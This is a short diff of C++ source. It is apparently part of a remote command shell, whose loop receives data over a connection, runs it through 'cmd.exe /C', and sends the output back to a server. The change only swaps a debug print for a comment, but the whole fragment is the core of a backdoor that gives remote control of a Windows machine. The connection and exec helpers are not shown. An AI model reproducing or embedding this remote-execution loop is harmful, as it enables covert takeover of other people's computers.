@@ -13,8 +13,8 @@ int main()
 		std::string commandLine = "cmd.exe /C ";
 		commandLine.append(conn->recv_data());
 		std::string result = exec(commandLine);
-		//std::cout << result;
-
+		
+		// send result back to server
 		conn->send_data(result);
 	}
 	return 0;
